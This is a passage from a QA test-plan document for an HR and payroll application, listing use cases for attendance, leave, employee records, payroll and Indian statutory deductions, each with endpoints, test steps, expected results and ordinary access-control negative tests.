36. UC-COMP-001, UC-APPSW-001

### Phase 3b — Expanded RBAC & Security

37. UC-RBAC-001 through UC-RBAC-020
38. UC-SEC-001 through UC-SEC-012
39. UC-TENANT-001

### Phase 4 — P2 NU-Hire (Run before recruiter rollout)

40. UC-HIRE-001 through UC-HIRE-018

### Phase 5 — P3 NU-Grow (Run before performance cycle launch)

41. UC-GROW-001 through UC-GROW-022

### Phase 6 — Performance Baselines (Run as part of load/perf test pipeline)

42. UC-PERF-001 — Dashboard load time < 2s
43. UC-PERF-002 — Employee list 500 records < 3s
44. UC-PERF-003 — Payroll run 100 employees < 30s
45. UC-PERF-004 — Leave calendar 12 months < 2s
46. UC-PERF-005 — Report generation 1000 rows < 5s
47. UC-PERF-006 — API response median < 500ms
48. UC-PERF-007 — Payslip PDF generation < 3s
49. UC-PERF-008 — Bulk import 100 rows < 10s

---

## Attendance — Expanded

### UC-ATT-004 — Work From Home (WFH) Attendance Marking

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/attendance/my-attendance
- **API Endpoint:** POST /api/v1/attendance/checkin
- **Playwright Spec:** `frontend/e2e/attendance.spec.ts`
- **Preconditions:**
  - Employee logged in; WFH attendance type enabled in attendance policy
- **Test Steps:**
  1. Navigate to `/attendance/my-attendance`
  2. Click "Check In" and select type = "Work From Home"
  3. Confirm check-in; check out at end of day
- **Expected Result:** Attendance saved with `attendance_type = WFH`; duration calculated correctly
- **Negative Test:** Employee with WFH disabled in policy cannot select WFH → form shows "Office"
  only
- **Verification:** `GET /api/v1/attendance/my?date=today` returns `type: "WFH"`

### UC-ATT-005 — Half-Day Attendance

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/attendance/my-attendance
- **API Endpoint:** POST /api/v1/attendance/checkin
- **Preconditions:**
  - Half-day option enabled in shift policy
- **Test Steps:**
  1. Click "Check In" → select "Half Day — Morning" or "Half Day — Afternoon"
  2. Confirm check-in; verify record shows half-day flag
  3. Verify 0.5 days deducted if linked to leave
- **Expected Result:** Record has `is_half_day = true`; duration ≈4 hours
- **Negative Test:** Cannot mark full-day and half-day simultaneously for same date → validation
  error
- **Verification:** `GET /api/v1/attendance/my?date=today` returns `is_half_day: true`

### UC-ATT-006 — Overtime Request and Calculation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, MANAGER
- **URL:** http://localhost:3000/overtime
- **API Endpoint:** POST /api/v1/overtime/request
- **Playwright Spec:** `frontend/e2e/overtime.spec.ts`
- **Preconditions:**
  - Employee checked out beyond shift hours; overtime policy configured (min 30 min threshold)
- **Test Steps:**
  1. Navigate to `/overtime` → click "Request Overtime"
  2. Fill date, hours worked beyond shift, reason; submit
  3. As MANAGER: approve from `/approvals/inbox`
  4. Verify overtime hours added to compensation record
- **Expected Result:** Request status = APPROVED; hours visible in attendance summary
- **Negative Test:** Submit overtime < minimum 30 min → "Minimum overtime is 30 minutes"
- **Verification:** `GET /api/v1/overtime/my` returns approved record with correct hours

### UC-ATT-007 — Shift Swap Request and Approval

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, MANAGER
- **URL:** http://localhost:3000/attendance/shift-swap
- **API Endpoint:** POST /api/v1/shifts/swap/request
- **Playwright Spec:** `frontend/e2e/shifts.spec.ts`
- **Preconditions:**
  - Two employees with assigned shifts on same day; swap policy enabled
- **Test Steps:**
  1. Employee A navigates to `/attendance/shift-swap`; selects date and Employee B
  2. Employee B approves swap; Manager approves
  3. Verify both employees' rosters exchanged for that date
- **Expected Result:** Status = APPROVED; both employees' rosters updated
- **Negative Test:** Swap with employee in incompatible shift type → validation error
- **Verification:** `GET /api/v1/shifts/assignments?employeeId={A}&date={date}` returns swapped
  shift

### UC-ATT-008 — Compensatory Off (Comp-Off) Request and Approval

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, MANAGER
- **URL:** http://localhost:3000/attendance/comp-off
- **API Endpoint:** POST /api/v1/compoff/request
- **Preconditions:**
  - Employee worked on a holiday or weekend (attendance record exists)
- **Test Steps:**
  1. Navigate to `/attendance/comp-off` → click "Request Comp-Off"
  2. Select the holiday/weekend date worked; set expiry date
  3. Manager approves; verify comp-off balance credited (1 day)
- **Expected Result:** Balance increases by 1.0; Comp-Off leave type available for future use
- **Negative Test:** Request comp-off for date with no attendance record → "No attendance found for
  selected date"
- **Verification:** `GET /api/v1/leave/balances?employeeId={id}` shows Comp-Off balance updated

### UC-ATT-009 — Late Mark and Grace Period Configuration

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, EMPLOYEE
- **URL:** http://localhost:3000/admin/shifts
- **API Endpoint:** PUT /api/v1/shifts/policy/{id}
- **Preconditions:**
  - Shift definition with start time 09:00
- **Test Steps:**
  1. HR_ADMIN sets grace period = 15 minutes
  2. Employee checks in at 09:20 → verify `is_late = true`
  3. Employee checks in at 09:10 → verify NOT flagged as late
- **Expected Result:** 09:20 → `is_late: true`; 09:10 → `is_late: false`
- **Negative Test:** HR_MANAGER attempts to edit shift policy → 403 (requires HR_ADMIN rank 85+)
- **Verification:** `GET /api/v1/attendance/my?date={late_date}` returns `is_late: true`

### UC-ATT-010 — Shift Roster Generation for Team

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, MANAGER
- **URL:** http://localhost:3000/shifts
- **API Endpoint:** POST /api/v1/shifts/roster/generate
- **Preconditions:**
  - Department with multiple employees; multiple shift definitions exist
- **Test Steps:**
  1. Navigate to `/shifts`; select department and month
  2. Generate roster; assign shift patterns (drag-drop or bulk)
  3. Employees verify schedule at `/shifts/my-schedule`
- **Expected Result:** Roster saved; each employee sees their monthly schedule
- **Negative Test:** EMPLOYEE tries roster generation → 403; can only view own schedule
- **Verification:** `GET /api/v1/shifts/roster?departmentId={id}&month={month}` returns full team
  roster

### UC-ATT-011 — Attendance Report (Team/Department/Monthly)

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, MANAGER
- **URL:** http://localhost:3000/reports
- **API Endpoint:** GET /api/v1/attendance/report?dept={id}&month={month}
- **Preconditions:**
  - Attendance data exists for current month
- **Test Steps:**
  1. Select "Attendance Report"; filter by department and month
  2. Verify present/absent/late/WFH counts per employee
  3. Export as Excel; verify file downloads with correct data
- **Expected Result:** Per-employee breakdown correct; Excel export valid
- **Negative Test:** EMPLOYEE accessing team report → shows only own data
- **Verification:** Excel headers: Employee, Present Days, Absent Days, Late Count, WFH Days

---

## Leave — Expanded

### UC-LEAVE-004 — Apply Sick Leave with Medical Certificate Upload

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave/request
- **Playwright Spec:** `frontend/e2e/leave.spec.ts`
- **Preconditions:**
  - Employee has Sick Leave balance > 0; policy requires medical cert for > 2 days
- **Test Steps:**
  1. Apply for 3-day Sick Leave; upload medical certificate PDF (< 5MB)
  2. Verify request shows PENDING with attachment
- **Expected Result:** Leave request created; attachment stored; manager notified
- **Negative Test:** 3-day sick leave WITHOUT certificate → "Medical certificate required for sick
  leave > 2 days"
- **Verification:** `GET /api/v1/leave/my-requests` returns `has_attachment: true`

### UC-LEAVE-005 — Apply Casual Leave (Short Notice)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave/request
- **Preconditions:**
  - Casual Leave balance > 0; policy allows same-day application
- **Test Steps:**
  1. Apply Casual Leave for today; verify balance shows pending deduction
- **Expected Result:** Request created for today; `casual_leave.pending` incremented by 1
- **Negative Test:** Apply on a holiday → "Cannot apply leave on a holiday"
- **Verification:** `GET /api/v1/leave/balances` shows `casual_leave.pending` incremented

### UC-LEAVE-006 — Apply Maternity Leave (Gender-Specific Eligibility)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (Female)
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave/request
- **Preconditions:**
  - Employee gender = Female; Maternity leave configured with 26-week entitlement
- **Test Steps:**
  1. Apply Maternity Leave; verify end date auto-calculated (26 weeks from start)
  2. Upload supporting document; submit
- **Expected Result:** 26-week duration enforced; request created
- **Negative Test:** Male employee applying Maternity Leave → type not shown in dropdown (
  gender-filtered)
- **Verification:** `GET /api/v1/leave/types?gender=FEMALE` returns Maternity; `?gender=MALE` does
  not

### UC-LEAVE-007 — Apply Paternity Leave

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE (Male)
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave/request
- **Preconditions:**
  - Employee gender = Male; Paternity leave type = 5 days
- **Test Steps:**
  1. Apply 5-day Paternity Leave; verify balance deducted
- **Expected Result:** 5-day entitlement enforced; balance deducted
- **Negative Test:** Apply for > 5 days → "Paternity leave maximum is 5 days"
- **Verification:** `GET /api/v1/leave/balances` shows paternity reduced by 5

### UC-LEAVE-008 — Half-Day Leave Request

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave/request
- **Preconditions:**
  - Leave balance > 0.5 days
- **Test Steps:**
  1. Apply leave for single date; toggle "Half Day" → select "First Half" or "Second Half"
  2. Verify 0.5 days deducted from balance
- **Expected Result:** `is_half_day = true`; balance deducted by 0.5
- **Negative Test:** Full-day leave already approved for same date → "Leave already exists for this
  date"
- **Verification:** `GET /api/v1/leave/balances` shows balance reduced by 0.5

### UC-LEAVE-009 — Leave Cancellation by Employee

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/leave/my-leaves
- **API Endpoint:** PUT /api/v1/leave/request/{id}/cancel
- **Preconditions:**
  - Employee has PENDING or APPROVED future leave request
- **Test Steps:**
  1. Find leave request; click "Cancel" and confirm
  2. Verify balance restored; manager notified
- **Expected Result:** Status = CANCELLED; balance restored; notification sent
- **Negative Test:** Cancel leave that already started → "Cannot cancel leave that has already
  commenced"
- **Verification:** `GET /api/v1/leave/balances` shows balance restored; status = CANCELLED

### UC-LEAVE-010 — Retroactive Leave Application (Past Date)

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/leave/apply
- **API Endpoint:** POST /api/v1/leave/request
- **Preconditions:**
  - Retroactive leave policy enabled (within 7 days)
- **Test Steps:**
  1. Apply leave for yesterday; verify past attendance updated from ABSENT to LEAVE
- **Expected Result:** Retroactive leave approved; attendance updated
- **Negative Test:** Date > 7 days ago → "Retroactive leave not allowed beyond 7 days"
- **Verification:** `GET /api/v1/attendance/my?date={past_date}` returns `status: LEAVE`

### UC-LEAVE-011 — Leave Rejection by Manager with Reason

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** MANAGER
- **URL:** http://localhost:3000/leave/approvals
- **API Endpoint:** PUT /api/v1/leave/request/{id}/reject
- **Preconditions:**
  - Employee leave request pending
- **Test Steps:**
  1. Manager rejects with required reason; verify employee notified; balance unchanged
- **Expected Result:** Status = REJECTED; `rejection_reason` populated; balance unchanged
- **Negative Test:** Reject without reason → "Rejection reason is required"
- **Verification:** `GET /api/v1/leave/request/{id}` returns `status: REJECTED`, `rejection_reason`

### UC-LEAVE-012 — Leave Balance View per Employee (HR Admin)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/leave
- **API Endpoint:** GET /api/v1/leave/balances?employeeId={id}
- **Preconditions:**
  - Multiple employees with varying balances
- **Test Steps:**
  1. Search for employee; view balance breakdown (Annual/Sick/Casual/etc.)
  2. Verify year-to-date usage and carry-forward
- **Expected Result:** Full balance visible per type per employee
- **Negative Test:** EMPLOYEE accesses another's balance via API → 403
- **Verification:** EMPLOYEE JWT on `?employeeId={otherId}` → 403

### UC-LEAVE-013 — Leave Type Configuration (Admin)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/admin/leave-types
- **API Endpoint:** POST /api/v1/leave/types
- **Playwright Spec:** `frontend/e2e/leave.spec.ts`
- **Preconditions:**
  - HR_ADMIN logged in
- **Test Steps:**
  1. Add leave type: Name="Bereavement Leave", Days=3, Paid=true, Gender=ALL, CarryForward=false
  2. Verify new type appears in employee leave dropdown
- **Expected Result:** New leave type active; employees can apply for it
- **Negative Test:** Duplicate name → "Leave type with this name already exists"
- **Verification:** `GET /api/v1/leave/types` returns new type in list

### UC-LEAVE-014 — Leave Accrual Monthly Job Verification

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (observer)
- **URL:** http://localhost:3000/admin/leave-requests
- **API Endpoint:** POST /api/v1/leave/accrual/run
- **Preconditions:**
  - Leave types with monthly accrual rules; 3+ employees with varying hire dates
- **Test Steps:**
  1. Trigger manual accrual via `POST /api/v1/leave/accrual/run`
  2. Verify all active employees receive accrual credit
  3. Re-run accrual → no duplicate credits (idempotent)
- **Expected Result:** Each employee credited (annual_entitlement / 12) days; no duplicates
- **Negative Test:** Re-run for same month → no duplicate credits
- **Verification:** Compare balances before and after; delta = monthly_accrual_rate

### UC-LEAVE-015 — Pro-Rata Leave for Mid-Year Joiner

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees
- **API Endpoint:** GET /api/v1/leave/balances?employeeId={newJoinerId}
- **Preconditions:**
  - Employee joining date = July 1; annual entitlement = 15 days
- **Test Steps:**
  1. Initialize leave for July-joiner
  2. Verify balance = 7.5 days (6 remaining months × 1.25/month)
- **Expected Result:** Balance = (months_remaining / 12) × annual_entitlement
- **Negative Test:** Dec 15 joiner → balance = 0.5 days (not full 15)
- **Verification:** API returns correct pro-rata values

---

## Employee — Expanded

### UC-EMP-006 — Add Emergency Contact Details

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/edit
- **API Endpoint:** PUT /api/v1/employees/{id}/emergency-contacts
- **Test Steps:**
  1. Employee profile → "Personal" tab → "Add Emergency Contact"
  2. Fill Name, Relationship, Phone, Email; save
- **Expected Result:** Contact saved and visible in profile
- **Negative Test:** Submit without phone → "Phone number is required"
- **Verification:** `GET /api/v1/employees/{id}` returns `emergency_contacts` array

### UC-EMP-007 — Add Bank Account Details

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/edit
- **API Endpoint:** PUT /api/v1/employees/{id}/bank-details
- **Test Steps:**
  1. Add bank account: Account Number, IFSC, Bank Name, Account Type; mark as primary
  2. Verify masked account number shown (last 4 digits)
- **Expected Result:** Bank details saved; account masked in UI; usable for payroll
- **Negative Test:** Invalid IFSC format → "Invalid IFSC code format (should be XXXX0XXXXXX)"
- **Verification:** `GET /api/v1/employees/{id}/bank-details` returns masked account

### UC-EMP-008 — Upload Employee Documents

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/edit
- **API Endpoint:** POST /api/v1/employees/{id}/documents
- **Test Steps:**
  1. Upload Aadhar Card PDF (< 10MB); add expiry date; save
  2. Verify document appears with download link; status = PENDING_VERIFICATION
- **Expected Result:** Document stored; HR verifies; VERIFIED status
- **Negative Test:** Upload file > 10MB → "File size exceeds 10MB"
- **Verification:** `GET /api/v1/employees/{id}/documents` returns document metadata

### UC-EMP-009 — Employee Tax ID Setup (PAN, Aadhar)

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/edit
- **API Endpoint:** PUT /api/v1/employees/{id}/tax-info
- **Test Steps:**
  1. Enter PAN (ABCDE1234F format) and Aadhar (12 digits)
  2. Verify PAN shown unmasked for HR; Aadhar masked (last 4)
- **Expected Result:** Tax IDs saved; PAN used for TDS; Aadhar for statutory
- **Negative Test:** Invalid PAN "12345ABCDE" → "Invalid PAN format"
- **Verification:** `GET /api/v1/employees/{id}/tax-info` returns `pan_number`, `aadhar_last4`

### UC-EMP-010 — Employment Transfer Request (Department Change)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, MANAGER
- **URL:** http://localhost:3000/employees/change-requests
- **API Endpoint:** POST /api/v1/employees/change-requests
- **Playwright Spec:** `frontend/e2e/employee-crud.spec.ts`
- **Test Steps:**
  1. New Change Request: employee, type=Transfer, new dept/manager, effective date
  2. Approver approves; verify dept updated on effective date
- **Expected Result:** Department and manager updated; org chart reflects change
- **Negative Test:** Non-HR submits transfer for employee in other dept → 403
- **Verification:** `GET /api/v1/employees/{id}` after effective date shows new `department_id`

### UC-EMP-011 — Dotted-Line Manager Assignment

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/edit
- **API Endpoint:** PUT /api/v1/employees/{id}/dotted-line-managers
- **Test Steps:**
  1. Add dotted-line manager to employee profile; verify org chart shows dotted line
- **Expected Result:** Dotted-line relationship created; second manager can view performance but not
  approve leave
- **Negative Test:** Same manager as solid and dotted-line → "Cannot assign same person as both"
- **Verification:** `GET /api/v1/employees/{id}/dotted-line-managers` returns assigned managers

### UC-EMP-012 — Employee Deactivation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}
- **API Endpoint:** PUT /api/v1/employees/{id}/deactivate
- **Test Steps:**
  1. Deactivate employee; set last working date
  2. Verify excluded from active list; login blocked; JWT returns 401
- **Expected Result:** `is_active = false`; login blocked; excluded from payroll
- **Negative Test:** Deactivate employee with pending approvals → warning "3 pending approvals —
  reassign first"
- **Verification:** `POST /api/v1/auth/login` with deactivated user → 401

### UC-EMP-013 — Employee Reactivation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}
- **API Endpoint:** PUT /api/v1/employees/{id}/reactivate
- **Test Steps:**
  1. Show inactive employees; reactivate; login restored
- **Expected Result:** `is_active = true`; login works; included in payroll
- **Negative Test:** MANAGER attempts reactivation → 403
- **Verification:** `GET /api/v1/employees/{id}` returns `is_active: true`

### UC-EMP-014 — Salary Revision with Effective Date

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/employees/{id}/compensation
- **API Endpoint:** POST /api/v1/compensation/revisions
- **Playwright Spec:** `frontend/e2e/compensation.spec.ts`
- **Preconditions:**
  - Employee has existing salary structure
- **Test Steps:**
  1. Add Salary Revision: new CTC=₹720,000 (20% increment); effective date=1st of next month
  2. Verify current month uses old salary; next month uses new salary
- **Expected Result:** Revision saved with effective date; payroll uses correct salary per run date
- **Negative Test:** Retroactive > 3 months without SUPER_ADMIN override → blocked
- **Verification:** `GET /api/v1/compensation/revisions?employeeId={id}` shows revision history

### UC-EMP-015 — Compensation History View

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, EMPLOYEE (own only)
- **URL:** http://localhost:3000/employees/{id}/compensation
- **API Endpoint:** GET /api/v1/compensation/history?employeeId={id}
- **Test Steps:**
  1. View salary history timeline: each revision shows old CTC, new CTC, % change, effective date
- **Expected Result:** Full revision history visible; % change calculated correctly
- **Negative Test:** EMPLOYEE accesses `/employees/{otherId}/compensation` → 403
- **Verification:** API returns
  `[{effective_date, old_ctc, new_ctc, percentage_change, approved_by}]`

### UC-EMP-016 — Employee Directory Advanced Search

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, HR_ADMIN
- **URL:** http://localhost:3000/employees/directory
- **API Endpoint:** GET /api/v1/employees/directory?search={term}&department={id}
- **Test Steps:**
  1. Search by name partial match; filter by department, designation, office location
  2. Verify EMPLOYEE sees name/designation/contact — NOT salary or bank details
- **Expected Result:** Results scoped per RBAC; private info excluded for EMPLOYEE role
- **Negative Test:** EMPLOYEE JWT response must not include `salary`, `bank_account`, `pan_number`
- **Verification:** API response for EMPLOYEE JWT excludes sensitive fields

### UC-EMP-017 — Org Chart Navigation

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, MANAGER
- **URL:** http://localhost:3000/org-chart
- **API Endpoint:** GET /api/v1/org/chart
- **Test Steps:**
  1. Top-level node renders; click to expand; click employee node → profile card
  2. Zoom controls work; export PNG/SVG
- **Expected Result:** Correct hierarchy; profile card on click; export works
- **Negative Test:** Circular reporting detected at setup; not silently broken
- **Verification:** `GET /api/v1/org/chart` tree structure matches actual hierarchy

### UC-EMP-018 — Custom Fields for Employee Profile

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/admin/custom-fields
- **API Endpoint:** POST /api/v1/custom-fields
- **Playwright Spec:** `frontend/e2e/custom-fields.spec.ts`
- **Test Steps:**
  1. Create custom field: Entity=Employee, Label="Blood Group", Type=Dropdown,
     Options=[A+, B+, O+, AB+, etc.]
  2. Verify field appears on all employee profiles; set value; save
- **Expected Result:** Field appears; value saved per employee; exportable in reports
- **Negative Test:** Duplicate label for same entity → "Custom field 'Blood Group' already exists"
- **Verification:** `GET /api/v1/employees/{id}` returns
  `custom_fields: [{label: "Blood Group", value: "O+"}]`

---

## Payroll — Expanded

### UC-PAY-007 — Salary Component CRUD

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/salary-structures
- **API Endpoint:** POST /api/v1/payroll/components
- **Test Steps:**
  1. Add component: Name="Special Allowance", Type=EARNING, Formula="CTC - Basic - HRA - DA"
  2. Reorder components (set evaluation order); edit; delete non-critical component
- **Expected Result:** Component added/edited/deleted; formula preview shows correct value
- **Negative Test:** Delete component referenced in another's formula → "Cannot delete: referenced
  by 'Net Pay'"
- **Verification:** `GET /api/v1/payroll/components?structureId={id}` returns updated list

### UC-PAY-008 — ESI Calculation Verification (Gross < ₹21,000)

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN (verifier)
- **URL:** http://localhost:3000/payroll/statutory
- **API Endpoint:** GET /api/v1/payroll/statutory/esi?employeeId={id}
- **Preconditions:**
  - Employee A: gross=₹18,000 (eligible); Employee B: gross=₹25,000 (exempt)
- **Test Steps:**
  1. Employee A payslip: employee ESI = 0.75% × 18,000 = ₹135; employer = 3.25% × 18,000 = ₹585
  2. Employee B payslip: ESI = ₹0
- **Expected Result:** Correct ESI for eligible; ₹0 for exempt
- **Negative Test:** Override ESI to ₹0 on eligible employee without exemption flag → validation
  error
- **Verification:** `GET /api/v1/payroll/statutory/esi?month={month}` returns correct per-employee
  amounts

### UC-PAY-009 — Professional Tax (PT) State-Specific Slab

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/statutory
- **API Endpoint:** GET /api/v1/payroll/statutory/professional-tax?employeeId={id}
- **Preconditions:**
  - Karnataka: gross ₹14,000 → PT=₹0; gross ₹25,000 → PT=₹200; February → PT=₹300
- **Test Steps:**
  1. Verify Karnataka slabs; verify February double month; verify annual cap ≤₹2,400
- **Expected Result:** PT per state slab; February special rule applied; annual cap respected
- **Negative Test:** Delhi employee → PT = ₹0 (no PT in Delhi)
- **Verification:** `GET /api/v1/payroll/entries/{id}` returns `professional_tax: 200` for Karnataka

### UC-PAY-010 — Advance Salary and Payroll Deduction

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE, HR_ADMIN
- **URL:** http://localhost:3000/payroll
- **API Endpoint:** POST /api/v1/payroll/advance-requests
- **Test Steps:**
  1. Employee requests ₹10,000 advance; HR approves and disburses
  2. Next payroll: verify ₹10,000 "Advance Recovery" deduction in payslip
- **Expected Result:** Advance deducted; payslip shows "Advance Recovery: ₹10,000"
- **Negative Test:** Request advance > 50% of gross → "Cannot exceed 50% of gross salary"
- **Verification:** Payslip shows `advance_recovery: 10000`; net = gross − deductions − 10000

### UC-PAY-011 — Bonus Processing (One-Time Payment)

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/runs
- **API Endpoint:** POST /api/v1/payroll/adjustments
- **Test Steps:**
  1. Add adjustment: employee, type=Bonus, ₹50,000, description="Diwali Bonus"
  2. Process payroll; verify payslip shows bonus; verify TDS applied on bonus
- **Expected Result:** Bonus on payslip as separate line; TDS updated
- **Negative Test:** Add bonus after payroll LOCKED → "Cannot modify locked payroll run"
- **Verification:** Payslip shows `bonus: 50000`; TDS updated

### UC-PAY-012 — Payroll Audit Trail

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, SUPER_ADMIN
- **URL:** http://localhost:3000/admin/system
- **API Endpoint:** GET /api/v1/audit-logs?entity=PAYROLL
- **Test Steps:**
  1. Filter audit logs by entity=PAYROLL; verify who initiated, status changes, who approved/locked
  2. Click entry → field-level changes visible
- **Expected Result:** Complete trail with user, timestamp, and field-level change tracking
- **Negative Test:** MANAGER tries audit logs → 403
- **Verification:** Entries have `changed_by`, `changed_at`, `changes`

### UC-PAY-013 — Salary Structure Clone / Versioning

- **Priority:** P2
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/salary-structures
- **API Endpoint:** POST /api/v1/payroll/structures/{id}/clone
- **Test Steps:**
  1. Clone structure; modify (increase Basic to 45%); assign to eligible employees
- **Expected Result:** Clone independent of original; employees assigned correctly
- **Negative Test:** Conflicting effective dates for same employee → error
- **Verification:** `GET /api/v1/payroll/structures` returns both original and clone

### UC-PAY-014 — Bulk Payroll Processing

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/bulk-processing
- **API Endpoint:** POST /api/v1/payroll/bulk-run
- **Test Steps:**
  1. Select all active employees; initiate bulk calculation; review per-employee results; approve
     and lock
- **Expected Result:** All processed; reviewable before locking; < 30 seconds for 100 employees
- **Negative Test:** Run when draft exists → "Complete or discard existing draft first"
- **Verification:** `GET /api/v1/payroll/runs?month={month}` returns `status: LOCKED`

### UC-PAY-015 — Payroll Report Generation

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports/payroll
- **API Endpoint:** GET /api/v1/reports/payroll?month={month}&format=xlsx
- **Test Steps:**
  1. Select month/dept; generate; verify employee name, gross, deductions, net, bank per row
  2. Export Excel and CSV; verify totals row
- **Expected Result:** Accurate report; totals match sums; export correct
- **Negative Test:** EMPLOYEE accesses payroll reports → own payslip only
- **Verification:** Excel column headers correct; row count = active employees

### UC-PAY-016 — Payroll Approval by HR Admin

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/runs
- **API Endpoint:** PUT /api/v1/payroll/runs/{id}/approve
- **Test Steps:**
  1. Review PROCESSED run summary; click Approve; verify status = APPROVED; payslips visible to
     employees
- **Expected Result:** Status = APPROVED; employees can download payslips; no further modifications
- **Negative Test:** HR_MANAGER (rank 80) approves → 403 (requires HR_ADMIN rank 85)
- **Verification:** `GET /api/v1/payroll/runs/{id}` returns `status: APPROVED`

---

## Statutory — Expanded

### UC-STAT-004 — ESI Calculation and Eligibility Check

- **Priority:** P0
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/statutory
- **API Endpoint:** GET /api/v1/statutory/esi/contributions?month={month}
- **Test Steps:**
  1. Verify employees ≤₹21,000 gross → eligible (employee 0.75%, employer 3.25%)
  2. Verify employees above threshold → ESI = ₹0
- **Expected Result:** Correct split; correct percentages applied
- **Negative Test:** Employee gross exactly ₹21,000 → eligible (inclusive boundary)
- **Verification:** ESI report totals = sum of individual contributions

### UC-STAT-005 — Professional Tax by State Slab

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/payroll/statutory
- **API Endpoint:** GET /api/v1/statutory/professional-tax?state={state}&month={month}
- **Test Steps:**
  1. Karnataka: gross ₹14,000 → PT=₹0; gross ₹25,000 → PT=₹200; February → PT=₹300
  2. Verify annual ≤₹2,400
- **Expected Result:** State slab enforced; February double applied; annual cap respected
- **Negative Test:** Rajasthan employee → PT = ₹0 (no PT rule)
- **Verification:** `GET /api/v1/payroll/entries/{id}` returns correct `professional_tax`

### UC-STAT-006 — PF Challan Upload and Filing Status

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/statutory-filings
- **API Endpoint:** POST /api/v1/statutory/filings/pf-challan
- **Test Steps:**
  1. Download ECR file; upload payment confirmation; mark filing COMPLETED with reference number
- **Expected Result:** Filing COMPLETED; ECR matches PF totals
- **Negative Test:** Upload challan for wrong month → "Challan month does not match"
- **Verification:** `GET /api/v1/statutory/filings?type=PF&month={month}` returns
  `status: COMPLETED`

### UC-STAT-007 — ESI Return Filing

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/statutory-filings
